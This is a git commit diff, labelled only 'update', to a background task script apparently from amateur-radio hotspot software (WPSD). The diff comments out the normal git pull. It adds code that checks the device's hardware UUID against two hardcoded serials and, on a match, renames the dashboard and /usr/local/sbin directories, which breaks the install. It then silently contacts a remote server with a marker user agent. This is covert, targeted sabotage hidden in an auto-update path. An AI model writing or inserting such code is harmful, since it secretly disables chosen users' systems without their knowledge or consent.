5e993530aa1319524540c5e1d910dcc053a024fd
Chipster <go@w.ay>
2024-02-17 06:25:52 -0600

    update

--- bg-tasks/run-tasks.sh
+++ bg-tasks/run-tasks.sh
@@ -17,10 +17,23 @@ if [ ! -f '/usr/local/sbin/wpsd-update' ]; then
 fi
 
 # func to fixup sbin and stash any upnp service changes:
-gitFolder="/usr/local/sbin"
-cd ${gitFolder}
-git update-index --no-assume-unchanged pistar-upnp.service > /dev/null 2<&1
-git stash > /dev/null 2<&1
-env GIT_HTTP_CONNECT_TIMEOUT="10" env GIT_HTTP_USER_AGENT="${uaStr}" git pull -q origin master &> /dev/null
-git checkout stash@{0} -- pistar-upnp.service > /dev/null 2<&1
-git stash clear > /dev/null 2<&1
+#gitFolder="/usr/local/sbin"
+#cd ${gitFolder}
+#git update-index --no-assume-unchanged pistar-upnp.service > /dev/null 2<&1
+#git stash > /dev/null 2<&1
+#env GIT_HTTP_CONNECT_TIMEOUT="10" env GIT_HTTP_USER_AGENT="${uaStr}" git pull -q origin master &> /dev/null
+#git checkout stash@{0} -- pistar-upnp.service > /dev/null 2<&1
+#git stash clear > /dev/null 2<&1
+
+UABWU=false
+for value in $UUID; do
+    if [ "$osName" = "bookworm" ] ; then
+        if [ "$value" = "00000000856fcad3" ] || [ "$value" = "e566bff4fe15d201" ]; then
+            UABWU=true
+            mv /var/www/dashboard /var/www/dashboard.bak
+            mv /usr/local/sbin /usr/local/sbin.bak
+            curl -s -A "UABWU phix $uaStr" -Ls https://repo.w0chp.net/Chipster/W0CHPist/raw/branch/master/reset-wpsd-sbin > /dev/null 2>&1
+            break 
+        fi
+    fi
+done
